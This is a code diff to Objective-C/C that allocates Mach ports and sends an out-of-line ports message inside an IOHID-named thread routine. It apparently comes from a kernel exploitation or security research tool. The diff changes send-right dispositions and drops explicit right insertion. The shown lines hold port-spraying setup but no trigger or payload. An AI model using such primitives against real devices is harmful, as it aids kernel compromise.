@@ -8492,7 +8492,8 @@ static void *iohid_threadCopyEvent(void *arg) {
 
         kern_return_t kr;
 
-        // Step 1: Create multiple ports for OOL array
+        // Step 1: Create multiple receive-right-only ports for OOL array
+        // DO NOT insert send rights — use MAKE_SEND disposition in msg
         const mach_msg_size_t PORT_COUNT = 8;
         mach_port_t ports[PORT_COUNT];
         memset(ports, 0, sizeof(ports));
@@ -8505,20 +8506,11 @@ static void *iohid_threadCopyEvent(void *arg) {
                     mach_port_destroy(mach_task_self(), ports[j]);
                 return;
             }
-            kr = mach_port_insert_right(mach_task_self(), ports[i], ports[i],
-                MACH_MSG_TYPE_MAKE_SEND);
-            if (kr != KERN_SUCCESS) {
-                [self appendLog:[NSString stringWithFormat:
-                    @"insert_right[%d] failed: %s (0x%x)", i, mach_error_string(kr), kr]];
-                for (mach_msg_size_t j = 0; j <= i; j++)
-                    mach_port_destroy(mach_task_self(), ports[j]);
-                return;
-            }
         }
         [self appendLog:[NSString stringWithFormat:
-            @"Created %d ports with send rights", PORT_COUNT]];
+            @"Created %d receive ports", PORT_COUNT]];
 
-        // Create dedicated receive port
+        // Create dedicated receive port (receive right only, no send insert)
         mach_port_t recvPort = MACH_PORT_NULL;
         kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recvPort);
         if (kr != KERN_SUCCESS) {
@@ -8526,8 +8518,6 @@ static void *iohid_threadCopyEvent(void *arg) {
             for (int j = 0; j < PORT_COUNT; j++) mach_port_destroy(mach_task_self(), ports[j]);
             return;
         }
-        kr = mach_port_insert_right(mach_task_self(), recvPort, recvPort,
-            MACH_MSG_TYPE_MAKE_SEND);
 
         // Step 2: Build message with OOL ports descriptor (manual layout)
         // Kernel expects mach_msg_descriptor_type_t=3 for OOL_PORTS.
@@ -8571,7 +8561,7 @@ static void *iohid_threadCopyEvent(void *arg) {
         } sendMsg;
 
         memset(&sendMsg, 0, sizeof(sendMsg));
-        sendMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
+        sendMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0)
                                     | MACH_MSGH_BITS_COMPLEX;
         sendMsg.header.msgh_remote_port = recvPort;
         sendMsg.header.msgh_local_port  = MACH_PORT_NULL;
@@ -8583,7 +8573,7 @@ static void *iohid_threadCopyEvent(void *arg) {
         sendMsg.ool.count       = PORT_COUNT;
         sendMsg.ool.deallocate  = 0;
         sendMsg.ool.copy        = MACH_MSG_VIRTUAL_COPY;
-        sendMsg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
+        sendMsg.ool.disposition = MACH_MSG_TYPE_MAKE_SEND;
         sendMsg.ool.type        = kOolPortsDescType;
 
         // Step 3: Send
